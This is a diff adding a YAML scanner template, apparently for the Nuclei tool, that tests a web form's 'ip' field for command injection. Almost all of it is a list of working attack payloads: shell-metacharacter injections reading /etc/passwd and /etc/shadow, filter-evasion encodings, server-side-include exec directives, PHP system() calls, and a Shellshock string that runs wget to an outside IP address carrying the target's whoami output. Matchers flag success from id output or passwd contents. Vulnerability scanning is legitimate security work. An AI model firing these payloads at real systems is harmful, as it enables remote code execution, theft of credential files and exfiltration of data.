@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "`cat%24u%20/etc%24u/passwd%24u`"
+        - "%29id"
+        - "%0Aid"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+ &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
+        - "%7Ccat%20/etc/passwd"
+        - "%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd"
+        - "%7Cid%0A"
+        - "||id"
+        - "a)|id|"
+        - "%7Ccat%24u%2B%2Fetc%24u%2Fpasswd%24u"
+        - "%0aid%0a"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "<?php system(\"cat /etc/passwd\");?>"
+        - "%0Aid"
+        - "%29%3Bid"
+        - "i\"d"
+        - "`id`"
+        - "||id"
+        - "%3B%0Awhoami"
+        - "%3Bid%7C"
+        - "%27%20id%3B"
+        - "<?php system(\"id\");?>"
+        - "||/usr/bin/id"
+        - "cat%20/etc/passwd"
+        - "|id|"
+        - "%0auname -a"
+        - "%7Cid"
+        - "|cat%3C%2Fetc%2Fpasswd"
+        - "&&cat%20/etc/passwd"
+        - "&cat%3B%2Fetc%2Fpasswd"
+        - "<?php system(\"cat /etc/passwd\");?>"
+        - ";cat%20/etc/passwd"
+        - "%0Aid"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=14?user=\\`whoami\\`\""
+        - "%7C%0Awhoami"
+        - "%7Bcat,/etc/passwd"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;<s"
+        - "%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd"
+        - "%7Bcat%2C%2Fetc%2Fpasswd%7D"
+        - "<?php system(\"id\");?>"
+        - "%3Bcat%2B%2Fetc%24u%2Fpasswd%24u"
+        - "%26%2Fusr%2Fbin%2Fid%26"
+        - "%3B%0Awhoami%0A%2Fusr%2Fbin%24u%0Aid%0A%3B"
+        - "%2Fusr%2Fbin%2Fid"
+        - "%27%3Bid"
+        - "%0Acat%20/etc/passwd"
+        - "%2B%0Awhoami"
+        - "&&/usr/bin/id"
+        - "|id"
+        - ";cat+/etc/passwd+#"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
